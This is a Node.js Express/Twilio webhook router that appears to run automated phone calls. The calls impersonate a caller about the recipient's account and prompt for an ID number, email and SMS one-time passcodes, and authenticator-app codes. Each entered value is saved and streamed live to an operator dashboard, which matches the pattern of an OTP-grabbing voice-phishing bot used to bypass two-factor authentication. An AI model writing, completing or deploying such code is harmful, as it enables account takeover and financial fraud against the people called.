const express = require('express');
const router = express.Router();
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const db = require('../database/db');

// Test endpoint
router.get('/test', (req, res) => {
    res.send('Webhook is working!');
});

// MAIN VOICE RESPONSE WITH DEBUGGING
router.post('/voice-response/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    // LOG EVERYTHING
    console.log('========== WEBHOOK CALLED ==========');
    console.log('SessionId:', sessionId);
    console.log('Body:', req.body);
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    
    try {
        // CHECK IF SESSION EXISTS
        console.log('Querying database for session:', sessionId);
        const session = await db.query(
            `SELECT cs.*, c.full_name FROM call_sessions cs 
             JOIN contacts c ON cs.contact_id = c.id 
             WHERE cs.id = $1`,
            [sessionId]
        );
        
        console.log('Session query result rows:', session.rows.length);
        
        if (session.rows.length === 0) {
            console.log('ERROR: Session not found in database!');
            twiml.say('Session not found. Goodbye.');
            twiml.hangup();
            return res.type('text/xml').send(twiml.toString());
        }
        
        const callData = session.rows[0];
        const currentAction = callData.current_action;
        const fullName = callData.full_name;
        const subject = callData.subject;
        const customIntro = callData.custom_intro;
        
        console.log('Current Action:', currentAction);
        console.log('Full Name:', fullName);
        console.log('Subject:', subject);
        
        if (currentAction === 'consent') {
            console.log('Sending consent prompt...');
            const gather = twiml.gather({
                numDigits: 1,
                action: `/webhooks/handle-consent/${sessionId}`,
                method: 'POST',
                timeout: 10
            });
            
            let greeting = fullName ? `Hello ${fullName}, ` : 'Hello our valued client, ';
            
            if (subject && customIntro) {
                gather.say(`${greeting}${customIntro} Press 1 to continue.`);
            } else if (subject) {
                gather.say(`${greeting}This is ${subject} calling. Press 1 to continue.`);
            } else {
                gather.say(`${greeting}We are contacting you regarding your account. Press 1 to continue.`);
            }
            
            gather.say('If you did not press anything, please try again.');
            
        } else if (currentAction === 'waiting_for_id') {
            console.log('Sending ID request prompt...');
            const gather = twiml.gather({
                numDigits: 20,
                action: `/webhooks/collect-id/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter your ID number followed by the pound key.');
            
        } else if (currentAction === 'waiting_for_email_otp') {
            console.log('Sending Email OTP prompt...');
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-email-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP from your email followed by the pound key.');
            
        } else if (currentAction === 'waiting_for_auth_otp') {
            console.log('Sending Auth OTP prompt...');
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-auth-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit code from your authenticator app followed by the pound key.');
            
        } else if (currentAction === 'waiting_for_phone_otp') {
            console.log('Sending Phone OTP prompt...');
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-phone-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6 digit OTP sent to your phone followed by the pound key.');
            
        } else {
            console.log('Unknown action:', currentAction);
            twiml.say('Please wait for admin instructions.');
            twiml.hangup();
        }
        
        console.log('Sending TwiML response...');
        res.type('text/xml');
        res.send(twiml.toString());
        
    } catch (error) {
        console.error('========== ERROR IN VOICE RESPONSE ==========');
        console.error('Error message:', error.message);
        console.error('Error stack:', error.stack);
        
        const twiml = new VoiceResponse();
        twiml.say('An error occurred. Please try again later.');
        twiml.hangup();
        res.type('text/xml');
        res.send(twiml.toString());
    }
});

// HANDLE CONSENT (USER PRESSES 1)
router.post('/handle-consent/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('========== CONSENT HANDLED ==========');
    console.log('SessionId:', sessionId);
    console.log('Digits pressed:', Digits);
    
    try {
        if (Digits === '1') {
            console.log('User pressed 1 - Updating session...');
            
            await db.query(
                `UPDATE call_sessions SET current_action = 'waiting_for_id' WHERE id = $1`,
                [sessionId]
            );
            
            await db.query(
                `INSERT INTO collected_data (session_id, data_type, data_value) VALUES ($1, $2, $3)`,
                [sessionId, 'consent', '1']
            );
            
            io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
            
            console.log('Session updated. Redirecting to voice-response...');
            twiml.say('Thank you. Please wait.');
            twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
            
        } else {
            console.log('User did not press 1. Ending call.');
            twiml.say('You did not press 1. Goodbye.');
            twiml.hangup();
        }
        
        res.type('text/xml');
        res.send(twiml.toString());
        
    } catch (error) {
        console.error('Error in handle-consent:', error);
        twiml.say('Error processing your request.');
        twiml.hangup();
        res.type('text/xml');
        res.send(twiml.toString());
    }
});

// COLLECT ID
router.post('/collect-id/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('========== ID COLLECTED ==========');
    console.log('SessionId:', sessionId);
    console.log('ID Entered:', Digits);
    
    try {
        if (Digits) {
            const session = await db.query(
                `SELECT contact_id FROM call_sessions WHERE id = $1`,
                [sessionId]
            );
            
            await db.query(
                `UPDATE contacts SET id_number = $1 WHERE id = $2`,
                [Digits, session.rows[0].contact_id]
            );
            
            io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
            
            twiml.say('Thank you. Your ID has been recorded.');
            twiml.hangup();
            
            await db.query(`UPDATE call_sessions SET status = 'completed', ended_at = NOW() WHERE id = $1`, [sessionId]);
        } else {
            twiml.say('No ID received. Goodbye.');
            twiml.hangup();
        }
        
        res.type('text/xml');
        res.send(twiml.toString());
        
    } catch (error) {
        console.error('Error collecting ID:', error);
        twiml.say('Error saving your ID.');
        twiml.hangup();
        res.type('text/xml');
        res.send(twiml.toString());
    }
});

// COLLECT EMAIL OTP
router.post('/collect-email-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Email OTP collected:', Digits);
    
    if (Digits) {
        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
        await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
        io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
        twiml.say('Thank you.');
        twiml.hangup();
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

// COLLECT AUTH OTP
router.post('/collect-auth-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Auth OTP collected:', Digits);
    
    if (Digits) {
        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
        await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
        io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
        twiml.say('Thank you.');
        twiml.hangup();
    } else {
        twiml.say('No code received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

// COLLECT PHONE OTP
router.post('/collect-phone-otp/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { Digits } = req.body;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');
    
    console.log('Phone OTP collected:', Digits);
    
    if (Digits) {
        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
        await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
        io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
        twiml.say('Thank you.');
        twiml.hangup();
    } else {
        twiml.say('No OTP received. Goodbye.');
        twiml.hangup();
    }
    
    res.type('text/xml');
    res.send(twiml.toString());
});

// CALL STATUS
router.post('/call-status/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { CallStatus, Duration } = req.body;
    const io = req.app.get('io');
    
    console.log('Call Status Update - Session:', sessionId, 'Status:', CallStatus);
    
    if (sessionId) {
        await db.query(
            `UPDATE call_sessions SET status = $1, duration_seconds = $2 WHERE id = $3`,
            [CallStatus, Duration || 0, sessionId]
        );
        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
    }
    
    res.sendStatus(200);
});

module.exports = router;
